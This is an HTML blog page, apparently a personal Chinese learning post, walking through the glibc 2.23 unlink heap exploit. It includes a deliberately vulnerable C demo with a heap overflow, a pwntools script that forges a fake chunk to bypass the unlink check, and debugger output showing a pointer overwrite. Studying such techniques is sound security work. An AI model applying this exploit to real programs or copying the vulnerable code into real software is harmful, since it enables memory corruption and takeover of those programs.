@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        第二次学习Unlink-Exploit - 一筐萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            <i>一筐萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        第二次学习Unlink-Exploit
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-08-05 14:28:24</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content no-indent">
+        <p>写了一个小demo来再次学习一个unlink攻击手法！</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> *heap_list[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">meau</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"--------------------"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1.create"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2.edit"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3.delete"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"4.show"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"5.exit"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"--------------------"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> you_size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input size:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;you_size);</span><br><span class="line">    <span class="keyword">if</span>(you_size&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"size error!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        heap_list[index]=<span class="built_in">malloc</span>(you_size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"input content:"</span>);</span><br><span class="line">        read(<span class="number">0</span>,heap_list[index],you_size);</span><br><span class="line">        index++;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"success!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> you_index,you_size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;you_index);</span><br><span class="line">    <span class="keyword">if</span>(you_index&gt;index)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"index error!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"edit size:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;you_size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"input content:"</span>);</span><br><span class="line">        read(<span class="number">0</span>,heap_list[you_index],you_size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"success!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> you_index;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;you_index);</span><br><span class="line">    <span class="keyword">if</span>(you_index&gt;index)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"index error!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">free</span>(heap_list[you_index]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"success!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> you_index;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;you_index);</span><br><span class="line">    <span class="keyword">if</span>(you_index&gt;index)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"index error!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(heap_list[you_index]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"success!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choose;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        meau();</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"you choose:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;choose);</span><br><span class="line">        <span class="keyword">switch</span>(choose)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                create();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                edit();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">delete</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"exit!"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"invalid choose!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当执行到<code>/root/glibc-2.23/malloc/malloc.c:4002</code>时，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/* consolidate backward */</span><br><span class="line">if (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = p-&gt;prev_size;</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((long) prevsize));</span><br><span class="line">  unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调试所用到的python代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r = process(<span class="string">"./test"</span>)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : r.sendlineafter(x,y)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : r.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">":"</span>+hex(x))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    rud(<span class="string">"you choose:\n"</span>)</span><br><span class="line">    sl(<span class="string">"1"</span>)</span><br><span class="line">    rud(<span class="string">"input size:\n"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    rud(<span class="string">"input content:\n"</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    rud(<span class="string">"you choose:\n"</span>)</span><br><span class="line">    sl(<span class="string">"2"</span>)</span><br><span class="line">    rud(<span class="string">"index:\n"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    rud(<span class="string">"edit size:"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    rud(<span class="string">"input content:\n"</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    rud(<span class="string">"you choose:\n"</span>)</span><br><span class="line">    sl(<span class="string">"3"</span>)</span><br><span class="line">    rud(<span class="string">"index:\n"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    rud(<span class="string">"you choose:\n"</span>)</span><br><span class="line">    sl(<span class="string">"4"</span>)</span><br><span class="line">    rud(<span class="string">"index:\n"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">"test_0"</span>)</span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">"test_1"</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">"test_2"</span>)</span><br><span class="line">target = <span class="number">0x000000000601080</span></span><br><span class="line">fd = target<span class="number">-0x18</span></span><br><span class="line">bk = target<span class="number">-0x10</span></span><br><span class="line">li(<span class="string">"fd"</span>,fd)</span><br><span class="line">li(<span class="string">"bk"</span>,bk)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">8</span>+p64(<span class="number">0x81</span>)+p64(fd)+p64(bk)+<span class="string">"a"</span>*<span class="number">0x60</span>+p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x90</span>,payload)</span><br><span class="line">gdb.attach(r)</span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"><span class="comment"># r.recv()</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>查看当前P的值是<code>0x19024b0</code>,chunk具体的值如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct malloc_chunk *)0x19024b0</span><br><span class="line">$4 = &#123;</span><br><span class="line">  prev_size = 128, </span><br><span class="line">  size = 144, </span><br><span class="line">  fd = 0xa315f74736574, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>也就是说当前p就是我们要free的chunk</p>
+<p>一句一句分析</p>
+<ul>
+<li><code>prevsize = p-&gt;prev_size;</code>获取到当前chunk的<code>prev_size</code>字段</li>
+<li><code>size += prevsize;</code>将当前chunk的size加上prevsize（也就是上一个chunk的大小）</li>
+<li><code>p = chunk_at_offset(p, -((long) prevsize));</code>指向当前chunk的指针向上太高了上一个chunk的总大小</li>
+<li><code>unlink(av, p, bck, fwd);</code>，然后进入到unlink操作</li>
+</ul>
+<p>原本我想的是进入到unlink里面去调试，但是没想到unlink是一个宏，然后又静态分析了一波unlink中得源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;								      \</span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;							      \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      \</span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      \</span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">	      malloc_printerr (check_action,				      \</span><br><span class="line">			       <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">			       P, AV);					      \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">                <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                  &#125;							      \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">              &#125;								      \</span><br><span class="line">          &#125;								      \</span><br><span class="line">      &#125;									      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先对FD、BK赋初值<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;								      \</span><br><span class="line">BK = P-&gt;bk;</span><br></pre></td></tr></table></figure></p>
+<p>我们伪造得数据使得：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">P  = 0x601080</span><br><span class="line">FD = 0x601080-0x18</span><br><span class="line">BK = 0x601080-0x10</span><br></pre></td></tr></table></figure></p>
+<p>下一步是检查chunk之间得关系，我们构造得数据恰恰可以绕过这个检查</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</span><br></pre></td></tr></table></figure>
+<p>然后到了最关键的两行代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK;							      \</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure>
+<p>把我们的数据带进去就是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x601068+0x18=0x601070</span><br><span class="line">0x601070+0x10=0x601068</span><br></pre></td></tr></table></figure></p>
+<p>所以可以造成<code>0x601080</code>的位置被覆盖成<code>0x601068</code></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过再一次的分析和尝试，更加理解了这个漏洞的原理和触发点</p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
